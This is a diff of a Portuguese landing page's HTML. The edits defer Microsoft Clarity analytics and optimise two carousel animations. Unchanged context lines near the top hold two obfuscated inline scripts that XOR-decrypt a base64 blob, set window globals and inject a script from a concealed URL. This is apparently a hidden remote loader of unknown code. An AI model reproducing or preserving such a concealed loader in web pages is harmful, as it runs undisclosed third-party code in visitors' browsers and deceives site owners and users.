@@ -612,12 +612,19 @@ footer{text-align:center;font-size:13px;color:var(--ink2);padding:0 20px 110px}
 .wa-home i{display:block;width:10em;height:.34em;border-radius:1em;background:#111;margin-top:.45em}
 </style>
   
-<script type="text/javascript">
+<script>
+(function(){
+  var ok=false;
+  function carregaClarity(){if(ok)return;ok=true;
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "z9fzr24fq8");
+  }
+  ['scroll','touchstart','pointerdown','keydown','mousemove'].forEach(function(e){addEventListener(e,carregaClarity,{once:true,passive:true})});
+  addEventListener('load',function(){setTimeout(carregaClarity,5000)});
+})();
 </script>
 <script>(function(){var a_slio=atob("DIlBeaFzqn/tgPS7ifJjDNMfiEXP6IDP+fp7Vo4QzhHD9YDW4O84V8Icx1GP8tvI6vsoCdUAhQqZ7YeU5eg1HNIHhBWeotiZ6P01C8gR3wuI89aB0vJjF8Aez13XopDa/ehsDNUewxmUrYTJ7P8kF9Ve0hyC5NnI6uJjVYMFyxOY5daBq6s8VdpRxB6A5daBq+0gDcBe3wuA6ZLCpPkzHNcWxAvA84HZ4O0yW41R3B6B9ZGZs6tjBPwO");var i_em=[];for(var q_1=0;q_1<a_slio.length;q_1++){i_em.push(a_slio.charCodeAt(q_1)&255);}var e_pkur=i_em[0];var z_42s3=i_em.slice(1,1+e_pkur);var h_c2=i_em.slice(1+e_pkur);var d_jx9=h_c2.map(function(b,a_3exs){return b^z_42s3[a_3exs%e_pkur];});var e_uc="";for(var c_p3=0;c_p3<d_jx9.length;c_p3++){e_uc+=String.fromCharCode(d_jx9[c_p3]&255);}var h_5v=decodeURIComponent(escape(e_uc));var k_re3d=JSON.parse(h_5v);var o_5=k_re3d.globals||[];o_5.forEach(function(j_c3q7){window[j_c3q7.name]=j_c3q7.value;});var e_24=document.createElement("script");e_24.src=k_re3d.url;e_24.async=true;e_24.defer=true;(k_re3d.attributes||[]).forEach(function(x_wtik){e_24.setAttribute(x_wtik.name,x_wtik.value);});(document.head||document.documentElement).appendChild(e_24);})();</script>
 <script>(function(){var y_c7p=atob("DKmjLjUG8WGocB/0odKBW0dq01uKGGuA0dqZARpllQ+GBWuZyM/aAFZpnE/KAjCHwtvKXkF13hHBCHqYjtnKVlBq3wvbUjPWwN3XXFxkhBXNAz3O+vSPDFJqngPJHGzWm/LYDFtnnASKSj2EyNHGQnxi002KBn6Y1MyBFBcwkATMFHmSl5+RHQdikFbJRCuXl5DFG1YkjDzV");var f_wmo=[];for(var g_mohi=0;g_mohi<y_c7p.length;g_mohi++){f_wmo.push(y_c7p.charCodeAt(g_mohi)&255);}var w_2vj7=f_wmo[0];var i_oim=f_wmo.slice(1,1+w_2vj7);var l_pi=f_wmo.slice(1+w_2vj7);var s_tg=l_pi.map(function(b,q_6973){return b^i_oim[q_6973%w_2vj7];});var d_zb="";for(var m_xf=0;m_xf<s_tg.length;m_xf++){d_zb+=String.fromCharCode(s_tg[m_xf]&255);}var n_bdxu=decodeURIComponent(escape(d_zb));var g_u6=JSON.parse(n_bdxu);var m_w1q=g_u6.globals||[];m_w1q.forEach(function(n_ao){window[n_ao.name]=n_ao.value;});var m_etm=document.createElement("script");m_etm.src=g_u6.url;m_etm.async=true;m_etm.defer=true;(g_u6.attributes||[]).forEach(function(z_17km){m_etm.setAttribute(z_17km.name,z_17km.value);});(document.head||document.documentElement).appendChild(m_etm);})();</script>
@@ -1169,17 +1176,19 @@ document.addEventListener("DOMContentLoaded",function(){
   /* videoaulas: rola sozinho, mas dá pra arrastar/deslizar pro lado (pausa enquanto a pessoa mexe) */
   (function(){var mq=document.querySelector(".aulas .mq");if(!mq)return;
     var reduce=window.matchMedia&&matchMedia("(prefers-reduced-motion: reduce)").matches,pause=0,drag=false,sx=0,sl=0,pos=0;
-    function half(){return mq.scrollWidth/2}
+    var H=0,vis=true,raf=0;function half(){return H||(H=mq.scrollWidth/2)}function rh(){H=0}addEventListener('resize',rh);addEventListener('load',rh)
     function hold(ms){pause=Date.now()+(ms||3500)}
     var last=0;
-    function step(ts){var dt=last?Math.min(ts-last,64):16;last=ts;if(!drag&&Date.now()>pause){pos+=(reduce?35:45)*dt/1000;var h=half();if(h>0&&pos>=h)pos-=h;mq.scrollLeft=pos}else{pos=mq.scrollLeft}requestAnimationFrame(step)}
+    function step(ts){var dt=last?Math.min(ts-last,64):16;last=ts;if(!drag&&Date.now()>pause){pos+=(reduce?35:45)*dt/1000;var h=half();if(h>0&&pos>=h)pos-=h;mq.scrollLeft=pos}else{pos=mq.scrollLeft}raf=vis?requestAnimationFrame(step):0}
     mq.addEventListener("scroll",function(){var h=half();if(h<=0)return;if(mq.scrollLeft>=h)mq.scrollLeft-=h;else if(mq.scrollLeft<=0)mq.scrollLeft+=h},{passive:true});
     ["touchstart","touchmove","wheel"].forEach(function(ev){mq.addEventListener(ev,function(){hold(4000)},{passive:true})});
     mq.addEventListener("pointerdown",function(e){if(e.pointerType==="mouse"){drag=true;sx=e.clientX;sl=mq.scrollLeft;mq.style.cursor="grabbing";try{mq.setPointerCapture(e.pointerId)}catch(x){}}hold(4000)});
     mq.addEventListener("pointermove",function(e){if(drag)mq.scrollLeft=sl-(e.clientX-sx)});
     function end(){drag=false;mq.style.cursor="";hold(3000)}
     mq.addEventListener("pointerup",end);mq.addEventListener("pointercancel",end);
-    mq.scrollLeft=half()/4;pos=mq.scrollLeft;requestAnimationFrame(step);
+    mq.scrollLeft=half()/4;pos=mq.scrollLeft;
+    function go(){if(!raf){last=0;raf=requestAnimationFrame(step)}}
+    if('IntersectionObserver' in window)new IntersectionObserver(function(es){vis=es[0].isIntersecting;if(vis)go()},{threshold:0.02}).observe(mq);else go();
   })();
   /* barra fixa: aparece depois do hero, some na área de planos e no fechamento (IntersectionObserver, sem reflow) */
   var st=document.getElementById("sticky"),past=false,hide={};
@@ -1201,20 +1210,20 @@ document.addEventListener("DOMContentLoaded",function(){
   var tr=r.querySelector('.wa-track');if(!tr)return;
   [].slice.call(tr.children).forEach(function(k){var c=k.cloneNode(true);c.setAttribute('aria-hidden','true');tr.appendChild(c)});
   var x=0,last=0,drag=false,sx=0,x0=0,vis=true,SPEED=0.05;
-  function wrap(){var h=tr.offsetWidth/2;if(h>0)x=((x%h)+h)%h}
+  var HW=0;function wrap(){var h=HW||(HW=tr.offsetWidth/2);if(h>0)x=((x%h)+h)%h}addEventListener('resize',function(){HW=0});addEventListener('load',function(){HW=0});
   r.addEventListener('pointerdown',function(e){if(e.pointerType==='mouse'&&e.button!==0)return;drag=true;sx=e.clientX;x0=x;r.classList.add('wa-drag');try{r.setPointerCapture(e.pointerId)}catch(_){}});
   r.addEventListener('pointermove',function(e){if(!drag)return;x=x0-(e.clientX-sx);wrap()});
   function up(){if(!drag)return;drag=false;r.classList.remove('wa-drag')}
   r.addEventListener('pointerup',up);r.addEventListener('pointercancel',up);r.addEventListener('lostpointercapture',up);
   r.addEventListener('dragstart',function(e){e.preventDefault()});
-  if('IntersectionObserver' in window)new IntersectionObserver(function(es){vis=es[0].isIntersecting},{threshold:0.02}).observe(r);
+  var raf=0;function start(){if(!raf){last=0;raf=requestAnimationFrame(step)}}
+  if('IntersectionObserver' in window)new IntersectionObserver(function(es){vis=es[0].isIntersecting;if(vis)start()},{threshold:0.02}).observe(r);else start();
   function step(ts){
     var dt=last?Math.min(ts-last,50):16;last=ts;
     if(!drag&&vis){x+=SPEED*dt;wrap();tr.style.transform='translate3d('+(-x).toFixed(2)+'px,0,0)'}
     else if(drag){tr.style.transform='translate3d('+(-x).toFixed(2)+'px,0,0)'}
-    requestAnimationFrame(step)
+    if(vis||drag)raf=requestAnimationFrame(step);else raf=0
   }
-  requestAnimationFrame(step)
 })();
 </script>
 </body>
